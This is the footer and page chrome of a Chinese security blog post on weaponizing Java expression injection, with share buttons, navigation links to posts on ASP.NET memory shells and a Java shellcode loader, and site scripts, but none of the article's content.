fa-telegram-plane fa-fw"></span></button><script>
        function shareOnMastodon(title, link) {
            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
            const domain = prompt("Enter your Mastodon domain", savedDomain);
            if (domain === null) {
                return;
            }
            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
            const text = title + "\n\n" + link;
            const url = new URL("https://" + domain)
            url.pathname = "share"
            url.searchParams.append('text', text)
            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
        }
    </script>
    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;Java表达式注入的武器化利用&#34;, &#34;https://yzddmr6.com/posts/java-expression-exploit/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/asp-net-memory-shell-virtualpath/" class="prev" rel="prev" title="ASP.NET下的内存马(四) VirtualPath内存马"><i class="fas fa-angle-left fa-fw"></i>ASP.NET下的内存马(四) VirtualPath内存马</a>
            <a href="/posts/litejre-for-shellcode-loader/" class="next" rel="next" title="精简JRE,打造无依赖的Java-ShellCode-Loader">精简JRE,打造无依赖的Java-ShellCode-Loader<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"><div id="utterances"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
            </noscript></div></article></div>
        </main><footer class="footer">
        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
            <div class="footer-line"></div>
            <div class="footer-line">
            </div>
        </div></footer></div>

    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
            <i class="fas fa-arrow-up fa-fw"></i>
        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
            <i class="fas fa-comment fa-fw"></i>
        </a>
    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
</body>

</html>